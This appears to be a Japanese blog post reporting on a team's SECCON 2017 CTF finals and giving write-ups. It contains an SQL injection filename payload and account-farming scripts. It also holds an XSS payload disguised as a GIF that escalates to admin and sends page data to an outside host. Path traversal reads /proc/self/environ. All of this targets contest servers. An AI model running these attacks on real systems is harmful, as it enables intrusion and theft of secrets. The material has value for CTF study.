<!DOCTYPE html><html lang="ja"><head><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XKSQ648BQ2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-XKSQ648BQ2')</script><meta charSet="utf-8"/><meta name="format-detection" content="telephone=no"/><meta name="viewport" content="initial-scale=1.0, width=device-width"/><meta name="author" content="sekai"/><meta name="generator" content="https://github.com/kaz/nextjs-blog-scaffold"/><meta property="og:url" content="https://6715.jp/posts/22/"/><meta property="og:site_name" content="6715.jp"/><link rel="icon" href="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg"/><link rel="canonical" href="https://6715.jp/posts/22/"/><title>SECCON2017国内決勝大会に出ました | 6715.jp</title><meta name="description" content="NaruseJunというチームでSECCON決勝に出ました。 決勝 ボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！ https://twitt…"/><meta name="twitter:card" content="summary"/><meta property="og:title" content="SECCON2017国内決勝大会に出ました | 6715.jp"/><meta property="og:type" content="article"/><meta property="og:image" content="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg"/><meta property="og:description" content="NaruseJunというチームでSECCON決勝に出ました。 決勝 ボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！ https://twitt…"/><meta property="article:published_time" content="2018-02-20T00:00:00.000Z"/><meta property="article:author" content="sekai"/><meta property="article:tag" content="CTF"/><meta property="article:tag" content="SECCON"/><meta property="article:tag" content="参加記"/><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/61bb26da18d2752efee9.css" as="style"/><link rel="stylesheet" href="/_next/static/css/61bb26da18d2752efee9.css" data-n-g=""/><link rel="preload" href="/_next/static/css/ad30b8ddc18c06e71d13.css" as="style"/><link rel="stylesheet" href="/_next/static/css/ad30b8ddc18c06e71d13.css" data-n-p=""/><noscript data-n-css=""></noscript></head><body><div id="__next"><header class="Header_header__1mCED"><h1><a href="/">6715.jp</a></h1></header><main class="posts_post__IJEgW"><section class="posts_meta__26MyQ"><small>2018-02-20</small><h1>SECCON2017国内決勝大会に出ました</h1><div><div><img src="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg" alt="sekai"/><a href="#profile">sekai</a></div><div><svg aria-hidden="true" role="img" class="octicon" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"></path></svg><a href="/tags/CTF/">CTF</a><a href="/tags/SECCON/">SECCON</a><a href="/tags/%E5%8F%82%E5%8A%A0%E8%A8%98/">参加記</a></div></div></section><div class="SocialShare_social__3xEln"><a rel="noopener noreferrer" target="_blank" href="https://social-plugins.line.me/lineit/share?url=https%3A%2F%2F6715.jp%2Fposts%2F22%2F"><span title="LINE" style="background-color:#00C300"><svg viewBox="0 0 24 24"><path fill="white" d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346 0 .627.285.627.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346 0 .628.285.628.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://twitter.com/share?url=https%3A%2F%2F6715.jp%2Fposts%2F22%2F&amp;text=SECCON2017%E5%9B%BD%E5%86%85%E6%B1%BA%E5%8B%9D%E5%A4%A7%E4%BC%9A%E3%81%AB%E5%87%BA%E3%81%BE%E3%81%97%E3%81%9F%20%7C%206715.jp"><span title="Twitter" style="background-color:#1DA1F2"><svg viewBox="0 0 24 24"><path fill="white" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F6715.jp%2Fposts%2F22%2F"><span title="Facebook" style="background-color:#1877F2"><svg viewBox="0 0 24 24"><path fill="white" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://b.hatena.ne.jp/add?url=https%3A%2F%2F6715.jp%2Fposts%2F22%2F"><span title="Hatena Bookmark" style="background-color:#00A4DE"><svg viewBox="0 0 24 24"><path fill="white" d="M20.47 0C22.42 0 24 1.58 24 3.53v16.94c0 1.95-1.58 3.53-3.53 3.53H3.53C1.58 24 0 22.42 0 20.47V3.53C0 1.58 1.58 0 3.53 0h16.94zm-3.705 14.47c-.78 0-1.41.63-1.41 1.41s.63 1.414 1.41 1.414 1.41-.645 1.41-1.425-.63-1.41-1.41-1.41zM8.61 17.247c1.2 0 2.056-.042 2.58-.12.526-.084.976-.222 1.32-.412.45-.232.78-.564 1.02-.99s.36-.915.36-1.48c0-.78-.21-1.403-.63-1.87-.42-.48-.99-.734-1.74-.794.66-.18 1.156-.45 1.456-.81.315-.344.465-.824.465-1.424 0-.48-.103-.885-.3-1.26-.21-.36-.493-.645-.883-.87-.345-.195-.735-.315-1.215-.405-.464-.074-1.29-.12-2.474-.12H5.654v10.486H8.61zm.736-4.185c.705 0 1.185.088 1.44.262.27.18.39.495.39.93 0 .405-.135.69-.42.855-.27.18-.765.254-1.44.254H8.31v-2.297h1.05zm8.656.706v-7.06h-2.46v7.06H18zM8.925 9.08c.71 0 1.185.08 1.432.24.245.16.367.435.367.83 0 .38-.13.646-.39.804-.265.154-.747.232-1.452.232h-.57V9.08h.615z"></path></svg></span></a></div><article class="posts_content__YuXhG"><p><strong>NaruseJun</strong>というチームでSECCON決勝に出ました。<h1>決勝</h1><p>ボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！<p><a href=https://twitter.com/_n_ari/status/964678908242157569 rel="noopener noreferrer"target=_blank>https://twitter.com/_n_ari/status/964678908242157569</a><h1>結果</h1><p>競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。 午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。 <strong>文部科学大臣賞 個人賞</strong>も頂きました。<blockquote class=twitter-tweet><p dir=ltr lang=ja><a href="https://twitter.com/hashtag/SECCON?src=hash&#38ref_src=twsrc%5Etfw">#SECCON</a> 2017 全国大会表彰式なう。<br>準優勝 NaruseJun <a href=https://t.co/AO1mHOV3IR>pic.twitter.com/AO1mHOV3IR</a></p>— ヤマハのネットワーク製品 (@yamaha_sn) <a href="https://twitter.com/yamaha_sn/status/964784430572232705?ref_src=twsrc%5Etfw">February 17, 2018</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script><blockquote class=twitter-tweet><p dir=ltr lang=ja><a href="https://twitter.com/hashtag/SECCON?src=hash&#38ref_src=twsrc%5Etfw">#SECCON</a> 2017 全国大会表彰式なう。<br>文部科学大臣賞 チーム賞、個人賞 <a href=https://t.co/tWwvgHVcie>pic.twitter.com/tWwvgHVcie</a></p>— ヤマハのネットワーク製品 (@yamaha_sn) <a href="https://twitter.com/yamaha_sn/status/964787478178615302?ref_src=twsrc%5Etfw">February 17, 2018</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script><blockquote class=twitter-tweet><p dir=ltr lang=ja>(準)優勝です <a href=https://t.co/YD84MRVprd>pic.twitter.com/YD84MRVprd</a></p>— sekai (@sekai67) <a href="https://twitter.com/sekai67/status/964792274025529345?ref_src=twsrc%5Etfw">February 17, 2018</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script><h1>Writeup</h1><h2>府中</h2><p>Web問？ Electronで書かれた音楽系SNSで、曲をアップロードできたりするようです。<h3>Attack</h3><p>アップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。<pre><code class="hljs language-sql"><span class=hljs-string>', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav
</span></code></pre><p>のようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。<p>いろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが<code>file</code>テーブル以外へのアクセス権を持っていないように見えました。 （挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）<p>で、結局ここから先がわかりませんでした…… ここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？ わかりません。<h3>Defence</h3><p>再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。<p>1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。 適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。<p>再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、 ストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。 アプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。<h4>再生数を増やすNode.js向けスクリプト</h4><pre><code class="hljs language-js"><span class=hljs-keyword>var</span> PromiseSocket = <span class=hljs-built_in>require</span>(<span class=hljs-string>'promise-socket'</span>);

<span class=hljs-keyword>async</span> <span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>getWAV</span>(<span class=hljs-params>streaming_host, streaming_port, song, api_key</span>) </span>{
    <span class=hljs-keyword>return</span> <span class=hljs-keyword>new</span> <span class=hljs-built_in>Promise</span>(<span class=hljs-keyword>async</span> (resolve, reject) => {
        <span class=hljs-keyword>const</span> socket = <span class=hljs-keyword>new</span> PromiseSocket();
        <span class=hljs-keyword>await</span> socket.connect({
            <span class=hljs-attr>host</span>: streaming_host,
            <span class=hljs-attr>port</span>: streaming_port
        });
        <span class=hljs-keyword>for</span>(<span class=hljs-keyword>let</span> i = <span class=hljs-number>0</span>; i &#60 <span class=hljs-number>100</span>; i++){
            <span class=hljs-comment>// '\x80': select song</span>
            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>"\x80"</span>);
            <span class=hljs-keyword>await</span> socket.write(song[<span class=hljs-string>'unique_id'</span>]);
            <span class=hljs-keyword>await</span> socket.write(api_key);
            <span class=hljs-comment>// '\x82': get WAV File Headers</span>
            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>"\x82"</span>);
            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>"\x84\xff\xff\xff\xff\xff\xff\xff\x7f"</span>);
            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>"\x81"</span>);
        }
        <span class=hljs-comment>// '\x90': close connection</span>
        <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>"\x90"</span>);
        <span class=hljs-comment>// let result = (await socket.readAll());</span>
        <span class=hljs-keyword>let</span> result = (<span class=hljs-keyword>await</span> socket.end());
        resolve(result);
    });
}


(<span class=hljs-keyword>async</span> _ => {
    <span class=hljs-built_in>console</span>.log(<span class=hljs-keyword>await</span> getWAV(<span class=hljs-string>"fuchu.koth.seccon"</span>, <span class=hljs-number>8000</span>, {<span class=hljs-attr>unique_id</span>: process.argv[<span class=hljs-number>2</span>]}, process.argv[<span class=hljs-number>3</span>]));
})();
</code></pre><h4>アカウントを量産して再生数を稼ぐスクリプト</h4><pre><code class="hljs language-sh"><span class=hljs-built_in>export</span> FLAG=<span class=hljs-string>"176872aa9e14b27d972e2c56b1ec16db"</span>
<span class=hljs-built_in>export</span> USERID=<span class=hljs-string>"2099"</span>
<span class=hljs-built_in>export</span> APIKEY=<span class=hljs-string>"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49"</span>
<span class=hljs-built_in>export</span> RESP=$(curl -X POST http://fuchu.koth.seccon/files -H <span class=hljs-string>"X-FUCHU-KEY: <span class=hljs-variable>$APIKEY</span>"</span> -F <span class=hljs-string>"file=@./po.wav;type=audio/wav"</span>)
<span class=hljs-built_in>export</span> UNIQID=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$RESP</span> | sed -E <span class=hljs-string>'s/[^:]+:"([^,]+)".+/\1/'</span>)
<span class=hljs-built_in>export</span> PAYLOAD=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>'{"name":"%s","unique_id":"%s","artist":%s,"description":"hello"}'</span> <span class=hljs-variable>$FLAG</span> <span class=hljs-variable>$UNIQID</span> <span class=hljs-variable>$USERID</span>)
curl -X POST http://fuchu.koth.seccon/songs -H <span class=hljs-string>"X-FUCHU-KEY: <span class=hljs-variable>$APIKEY</span>"</span> -H <span class=hljs-string>"Content-Type: application/json"</span> --data <span class=hljs-string>"<span class=hljs-variable>$PAYLOAD</span>"</span>

<span class=hljs-keyword>while</span> <span class=hljs-literal>true</span>
<span class=hljs-keyword>do</span>
	<span class=hljs-built_in>export</span> USER=$(head /dev/urandom | md5)
	<span class=hljs-built_in>export</span> PAYLOAD=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>'{"username":"%s","password":"Hello I Am NaruseJun","email":"%s@seccon.jp","sex":"0","birthday":"2018-02-15","free_text":""}'</span> <span class=hljs-variable>$USER</span> <span class=hljs-variable>$USER</span>)
	curl -X POST http://fuchu.koth.seccon/users -H <span class=hljs-string>"Content-Type: application/json"</span> --data <span class=hljs-string>"<span class=hljs-variable>$PAYLOAD</span>"</span>
	<span class=hljs-built_in>export</span> PAYLOAD=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>'{"username":"%s","password":"Hello I Am NaruseJun"}'</span> <span class=hljs-variable>$USER</span>)
	<span class=hljs-built_in>export</span> RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H <span class=hljs-string>"Content-Type: application/json"</span> --data <span class=hljs-string>"<span class=hljs-variable>$PAYLOAD</span>"</span>)
	<span class=hljs-built_in>export</span> APIKEY=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$RESP</span> | sed -E <span class=hljs-string>'s/.+"(.+)".+/\1/'</span>)
	node increment.js <span class=hljs-variable>$UNIQID</span> <span class=hljs-variable>$APIKEY</span>
<span class=hljs-keyword>done</span>
</code></pre><p>これらを用いると、ディフェンスキーワードをランキングに載せることができるので、 チームメイトにお願いして書き込み続けてもらいました。<h2>船橋</h2><p>提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、 そのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。<p>教師用データセットも与えられるので、機械学習するのが正攻法？ 他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。<p>ボクが目視でそれっぽい指紋を選んだら通りました。 競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。<h2>幕張</h2><p>スマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。<p>後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？ なんか外と通信しているんだろうなぁというのは分かったんですが、 ELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。<h2>梅田</h2><p>画像投稿サイト。Web問。<h3>Defence</h3><p>まず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、 もっともFav数の多いページにキーワードを書き込み続けるだけでした。<p>どのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、 そもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、 それほど頻繁には変わっていませんでした。 登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？<pre><code class="hljs language-sh"><span class=hljs-keyword>while</span> <span class=hljs-literal>true</span>
<span class=hljs-keyword>do</span>
	<span class=hljs-built_in>export</span> CONTENT=44b106151c01d64e0c479eb43ef12a48
	curl http://umeda.koth.seccon/photos/1 -H <span class=hljs-string>"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569"</span> > cache
	<span class=hljs-built_in>export</span> NAME=$(cat cache | sed -E <span class=hljs-string>'s/.+"csrf_name" value="([^"]+)".+/\1/'</span>)
	<span class=hljs-built_in>export</span> VALUE=$(cat cache | sed -E <span class=hljs-string>'s/.+"csrf_value" value="([^"]+)".+/\1/'</span>)
	curl http://umeda.koth.seccon/photos/1/comment -X POST -H <span class=hljs-string>"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569"</span> -d csrf_name=<span class=hljs-variable>$NAME</span> -d csrf_value=<span class=hljs-variable>$VALUE</span> -d content=<span class=hljs-variable>$CONTENT</span>
<span class=hljs-keyword>done</span>
</code></pre><h3>Attack</h3><p>1つ目のFLAGは、普通に<code>ID:1</code>の画像ページに書いてあった。<p>不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。 ただし、<code>Content-Security-Policy: script-src 'self'</code>ヘッダがついているので、 画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。<p>こんな感じに、<code>GIF8</code>がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。<pre><code class="hljs language-js">GIF8=<span class=hljs-number>8</span>;

fetch(<span class=hljs-string>"/admin/users"</span>, {<span class=hljs-attr>credentials</span>: <span class=hljs-string>'include'</span>})
.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> r.text())
.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> {
	<span class=hljs-keyword>const</span> [,v] = r.match(<span class=hljs-regexp>/name="csrf_value" value="(.+?)"/</span>);
	<span class=hljs-keyword>const</span> [,n] = r.match(<span class=hljs-regexp>/name="csrf_name" value="(.+?)"/</span>);
	<span class=hljs-keyword>const</span> body = <span class=hljs-string>`csrf_value=<span class=hljs-subst>${v}</span>&#38csrf_name=<span class=hljs-subst>${n}</span>&#38name=azon`</span>;
	<span class=hljs-keyword>return</span> fetch(<span class=hljs-string>"/admin/new-admin"</span>, {
		body,
		<span class=hljs-attr>method</span>: <span class=hljs-string>"POST"</span>,
		<span class=hljs-attr>headers</span>: {
			<span class=hljs-string>'Content-Type'</span>: <span class=hljs-string>'application/x-www-form-urlencoded'</span>,
		},
		<span class=hljs-attr>credentials</span>: <span class=hljs-string>'include'</span>,
	});
})
.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> r.text())
.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> fetch(<span class=hljs-string>"http://192.168.14.4:8000/users"</span>, {<span class=hljs-attr>method</span>: <span class=hljs-string>"POST"</span>, <span class=hljs-attr>body</span>: r}))
</code></pre><p>管理者のブラウザで適当に<code>/admin</code>ページを漁ると、 どうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。 管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。<p>で、更に管理者ページを探すと<code>/admin/logs</code>というアプリのログを確認する機能が存在することがわかります。 このページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、 さらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。<p>管理者で<code>/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php</code>としてソースの末尾を見ると、 4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。 ちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。<p>環境変数は<code>/admin/logs?p=/../../../../../../proc/self/environ</code>で読めます。</article><div class="SocialShare_social__3xEln"><a rel="noopener noreferrer" target="_blank" href="https://social-plugins.line.me/lineit/share?url=https%3A%2F%2F6715.jp%2Fposts%2F22%2F"><span title="LINE" style="background-color:#00C300"><svg viewBox="0 0 24 24"><path fill="white" d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346 0 .627.285.627.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346 0 .628.285.628.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://twitter.com/share?url=https%3A%2F%2F6715.jp%2Fposts%2F22%2F&amp;text=SECCON2017%E5%9B%BD%E5%86%85%E6%B1%BA%E5%8B%9D%E5%A4%A7%E4%BC%9A%E3%81%AB%E5%87%BA%E3%81%BE%E3%81%97%E3%81%9F%20%7C%206715.jp"><span title="Twitter" style="background-color:#1DA1F2"><svg viewBox="0 0 24 24"><path fill="white" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F6715.jp%2Fposts%2F22%2F"><span title="Facebook" style="background-color:#1877F2"><svg viewBox="0 0 24 24"><path fill="white" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://b.hatena.ne.jp/add?url=https%3A%2F%2F6715.jp%2Fposts%2F22%2F"><span title="Hatena Bookmark" style="background-color:#00A4DE"><svg viewBox="0 0 24 24"><path fill="white" d="M20.47 0C22.42 0 24 1.58 24 3.53v16.94c0 1.95-1.58 3.53-3.53 3.53H3.53C1.58 24 0 22.42 0 20.47V3.53C0 1.58 1.58 0 3.53 0h16.94zm-3.705 14.47c-.78 0-1.41.63-1.41 1.41s.63 1.414 1.41 1.414 1.41-.645 1.41-1.425-.63-1.41-1.41-1.41zM8.61 17.247c1.2 0 2.056-.042 2.58-.12.526-.084.976-.222 1.32-.412.45-.232.78-.564 1.02-.99s.36-.915.36-1.48c0-.78-.21-1.403-.63-1.87-.42-.48-.99-.734-1.74-.794.66-.18 1.156-.45 1.456-.81.315-.344.465-.824.465-1.424 0-.48-.103-.885-.3-1.26-.21-.36-.493-.645-.883-.87-.345-.195-.735-.315-1.215-.405-.464-.074-1.29-.12-2.474-.12H5.654v10.486H8.61zm.736-4.185c.705 0 1.185.088 1.44.262.27.18.39.495.39.93 0 .405-.135.69-.42.855-.27.18-.765.254-1.44.254H8.31v-2.297h1.05zm8.656.706v-7.06h-2.46v7.06H18zM8.925 9.08c.71 0 1.185.08 1.432.24.245.16.367.435.367.83 0 .38-.13.646-.39.804-.265.154-.747.232-1.452.232h-.57V9.08h.615z"></path></svg></span></a></div></main><footer class="Footer_footer__22y9A"><div id="profile" class="Footer_profile__39Joc"><img src="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg" alt="sekai"/><div><small>Author</small><strong>sekai<a rel="noopener noreferrer" target="_blank" href="https://github.com/kaz"><span title="GitHub" style="background-color:initial"><svg viewBox="0 0 24 24"><path fill="#181717" d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://twitter.com/sekai67"><span title="Twitter" style="background-color:initial"><svg viewBox="0 0 24 24"><path fill="#1DA1F2" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/sawada.kazuki"><span title="Facebook" style="background-color:initial"><svg viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg></span></a></strong><p>インフラとDXが好き</p></div></div><div class="Footer_copyright__3QtRW">© <!-- -->2016 sekai</div></footer></div></body></html>